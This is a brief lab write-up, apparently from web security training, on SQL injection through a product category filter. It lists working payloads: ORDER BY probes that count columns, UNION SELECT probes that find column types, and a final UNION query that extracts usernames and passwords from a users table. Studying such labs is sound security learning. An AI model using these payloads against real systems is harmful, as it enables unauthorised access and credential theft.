# Lab 05

## SQLi - Product category filter

**Goal**: Retrieve username and password from users table.

**Analysis**

**Step 1**

- Find the number of columns of the compromised table

- The "ORDER BY" clause could be used to perform this

- The following returns an internal server error if the number passed after the "ORDER BY" clause exceeds the number of columns

> ' ORDER BY 1--

> ' ORDER BY 2--

- The followng will return an Internal Server Error

> ' ORDER BY 3--

**Step 2**

- Find the data type of each column

- The "UNION" clause could be used to perform this

- The following returns an internal server error if the data type passed after the "UNION" caluse does not match the correct data type of the column

> ' UNION SELECT 'str', NULL--

> ' UNION SELECT 'str', 'str'--

**step 3**

- Use the previous information to extract the administrator's password

> ' UNION SELECT username, password FROM users--